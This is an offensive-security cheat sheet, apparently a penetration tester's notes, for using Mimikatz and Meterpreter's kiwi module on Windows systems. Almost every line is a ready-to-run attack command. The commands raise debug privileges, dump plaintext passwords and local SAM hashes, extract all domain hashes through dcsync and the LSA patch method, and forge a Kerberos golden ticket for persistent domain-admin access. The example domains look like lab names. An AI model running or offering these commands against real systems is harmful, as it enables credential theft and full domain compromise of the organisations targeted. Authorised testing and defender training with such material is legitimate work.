# Mimikatz

Use Mimikatz to dump local and domain plaintext credentials and hashes.

---

## Ensure you have administrative privileges

On a **Mimikatz prompt**:

```powershell
mimikatz: privilege::debug
```

On **Meterpreter**:

```bash
meterpreter > use kiwi
meterpreter > kiwi_cmd privilege::debug
```

If the output is **Privilege '20' OK**, you're good to move forward.

---

## Mimikatz One-Liner to Dump Local Hashes & Secrets

```powershell
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

---

## Dump Domain Hashes (dcsync method)

On a **Mimikatz prompt**:

```powershell
mimikatz: lsadump::dcsync /domain:$DOMAIN_NAME /all # HYDRA.test
```

```powershell
mimikatz: lsadump::dcsync /domain:marvel.test /all # HYDRA.test
```

On **Meterpreter**:

```bash
meterpreter > use kiwi
meterpreter > dcsync_ntlm $DOMAIN_USER # HYDRA\\grant.ward
```

---

## Dump Domain Hashes (lsa method)

On a **Mimikatz prompt**:

```powershell
mimikatz: lsadump::lsa /patch
```

---

## Create and Use a golden ticket

```powershell
mimikatz: kerberos::golden /user:$TARGET_USER_NAME /domain:$DOMAIN_NAME /sid:$DOMAIN_SID /krbtgt:$KRBTGT_NTLM /id:$TARGET_USER_ID /ptt
```

![Creating a golden ticket using Mimikatz](golden-ticket-kerberos-golden.png)

Open up a new command prompt that leverages the golden ticket (must be in a GUI session to access the new command prompt).

```powershell
mimikatz: misc::cmd
```
